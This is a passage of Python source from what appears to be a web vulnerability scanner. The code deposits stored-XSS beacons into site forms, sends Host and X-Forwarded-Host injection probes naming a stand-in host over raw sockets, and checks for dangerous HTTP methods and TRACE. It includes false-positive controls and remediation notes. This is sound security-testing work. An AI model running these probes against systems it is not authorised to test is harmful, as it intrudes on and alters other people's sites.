                continue
            if v == "":
                data[n] = bead
                fill += 1
            elif n in ("name", "message", "comment", "title", "subject",
                       "bio", "content", "text", "review", "feedback"):
                data[n] = bead
                fill += 1
        if not fill:
            continue
        try:
            engine.http.post(addr, data=data, allow_redirects=False)
        except Exception:
            continue
    # Re-fetch each crawled page after the deposits and look for the beacon.
    # Testing the bodies in state["pages"] directly would never fire: those
    # were captured during the crawl, before anything was deposited. The
    # pre-deposit body is the control — the beacon being in the fresh copy and
    # absent from the crawl copy is what shows the deposit put it there.
    for page in engine.state.get("pages", [])[:20]:
        url = page.get("url") or ""
        if not url:
            continue
        before = page.get("body", "") or ""
        try:
            after = getattr(engine.http.get(url, allow_redirects=False),
                            "body", "") or ""
        except Exception:
            continue
        if bead[:10] in after and bead[:10] not in before:
            record("stored_xss", Point(url, "GET", [], url),
                   "stored-response",
                   _mk_result(bead, "beacon rendered in %s" % url,
                              body=after[:60000], control_body=before,
                              control_clean=True))


def _check_host_header(engine, targets):
    """Host-header injection / web-cache poisoning surface: send a Host (and
    X-Forwarded-Host) override via raw socket and look for reflection into
    body or Location."""
    hosty = "vajra-oob.example"
    for wt in targets[:6]:
        base = wt["url"].rstrip("/")
        pr = urlparse(base)
        host = pr.hostname
        port = pr.port or (443 if pr.scheme == "https" else 80)
        tls = pr.scheme == "https"
        path = pr.path or "/"
        for hdr in ("Host", "X-Forwarded-Host"):
            req = "%s %s HTTP/1.1\r\n%s: %s\r\nConnection: close\r\n\r\n" % (
                "GET", path, hdr, hosty)
            raw = raw_http(host, port, req, tls=tls, timeout=4, socks5=getattr(engine, 'socks', None))
            if not raw:
                continue
            head, _, body = raw.partition(b"\r\n\r\n")
            loc = b""
            for line in head.split(b"\r\n"):
                if line.lower().startswith(b"location:"):
                    loc = line
            if hosty.encode() in body or hosty.encode() in loc:
                if hosty.encode() in body:
                    i = body.find(hosty.encode())
                    snippet = body[max(0, i - 160):i + 220]
                else:
                    snippet = loc
                detail_w = "the response body" if hosty.encode() in body \
                    else "Location header"
                # Reflection alone is not cache poisoning — the rule for
                # header_injection requires a marker and a clean control.
                # The control here is the same request with the real Host header.
                # If the server echoes the real Host too, the finding is
                # suppressed (it's just the default vhost showing its name).
                # That is the correct call: a default page echoing Host is
                # common and harmless; a poisoning surface only exists if the
                # reflection is *exclusive* to the attacker-supplied value.
                req_real = "%s %s HTTP/1.1\r\n%s: %s\r\nConnection: close\r\n\r\n" % (
                    "GET", path, hdr, host)
                raw_real = raw_http(host, port, req_real, tls=tls, timeout=4,
                                    socks5=getattr(engine, 'socks', None))
                _, _, body_real = (raw_real or b"").partition(b"\r\n\r\n")
                engine.record(
                    engine.target.display, "web.vulnscan", "misconfiguration",
                    "medium",
                    "Host Header Injection / web-cache poisoning surface",
                    detail=("%s: %s reflected into %s on %s. NOTE: an unconfigured "
                            "default/error page echoing the Host header is "
                            "common and is NOT proof of cache poisoning — "
                            "confirm a pathological caching CDN/devider "
                            "manually before treating this as exploitable."
                            % (hdr, hosty, detail_w, base)),
                    evidence=("raw socket GET %s with %s: %s\n--- "
                              "reflected occurrence ---\n%s"
                              % (path, hdr, hosty,
                                 snippet.decode("utf-8", "replace")[:600])),
                    remediation=REM["hostinject"],
                    cls="header_injection",
                    proof=P.marker(
                        snippet.decode("utf-8", "replace")[:400],
                        control_clean=_ctl_state(hosty, body_real)))
                engine.log.finding("[HOST-INJECT] %s reflected via %s at %s"
                                   % (hosty, hdr, base))
                return


class _Res:
    """The result shape `record()` reads.

    `AdaptiveAttacker` returns a real AttackResult; the bespoke probes
    (`_blind_sqli`, `_hpp_test`, `_blind_rce_oob`) build one of these instead.
    The defaults keep that second group honest: `body` empty and
    `control_body` None mean the proof gate finds nothing it can verify and
    refuses the candidate, rather than assuming a signal it cannot see.
    """

    def __init__(self):
        self.success = ""
        self.technique = "direct"
        self.evidence = ""
        self.attempts = 0
        self.blocked = 0
        self.evasion_log = []
        self.body = ""
        self.status = 0
        self.control_body = None
        self.control_clean = None
        self.expected = ""
        self.reproduced = False
        self.dest = ""
        self.location = ""
        self.control_location = None


def _mk_result(payload, note, body="", control_body=None, control_clean=None,
               reproduced=False, dest=""):
    r = _Res()
    r.success = payload
    r.technique = note
    r.evidence = "payload=%s\n%s" % (payload, note)
    r.attempts = 1
    r.blocked = 0
    r.body = body or ""
    r.control_body = control_body
    r.control_clean = control_clean
    r.reproduced = reproduced
    r.dest = dest
    return r


def _check_methods(engine, targets):
    for wt in targets:
        base = wt["url"].rstrip("/")
        r = engine.http.options(base)
        allow = r.headers.get("allow", "") or r.headers.get("public", "")
        danger = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT", "MOVE")
                  if m in allow.upper()]
        if danger:
            engine.record(
                engine.target.display, "web.vulnscan", "misconfiguration",
                "medium" if "TRACE" in danger else "low",
                "Dangerous HTTP methods advertised: %s" % ", ".join(danger),
                evidence="OPTIONS %s -> Allow: %s" % (base, allow),
                remediation="Disable unused HTTP methods at the server config.",
                cls="misconfiguration",
                proof=P.observation(
                    "OPTIONS %s returned Allow: %s" % (base, allow),
                    note="advertised dangerous methods"))
        tr = engine.http.request("TRACE", base, headers={"Vajra-Probe": "1"})
        if tr.status == 200 and "vajra-probe" in tr.body.lower().replace("-", ""):
            engine.record(
                engine.target.display, "web.vulnscan", "misconfiguration",
                "medium", "TRACE enabled (Cross-Site Tracing surface)",
                evidence="TRACE echoed request headers",
                remediation="Disable TRACE method at the server config.",
                cls="misconfiguration",
                proof=P.observation(
                    "TRACE %s echoed request body" % base,
                    note="cross-site tracing surface"))